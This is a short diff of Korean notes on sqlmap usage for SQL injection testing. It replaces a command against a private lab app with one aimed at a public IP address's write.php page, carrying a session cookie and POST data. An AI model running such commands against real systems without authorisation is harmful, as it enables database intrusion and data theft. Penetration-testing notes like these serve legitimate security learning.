@@ -12,7 +12,7 @@
 
 	쿠키값이 필요할 경우
 
-		sqlmap -u "http://192.168.23.131/cat.php?id=1" --cookie="security=low; PHPSESSID=letmado2cqoj2vd2i0873168h5; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --dbs
+		sqlmap -u "http://211.250.216.249:5080/board/write.php" --cookie="PHPSESSID=3i43aetq32fb1ft32el5591m75;" --data "title=Test%20Title&content=This%20is%20a%20test%20content."
 
 	테이블 목록 조회
 
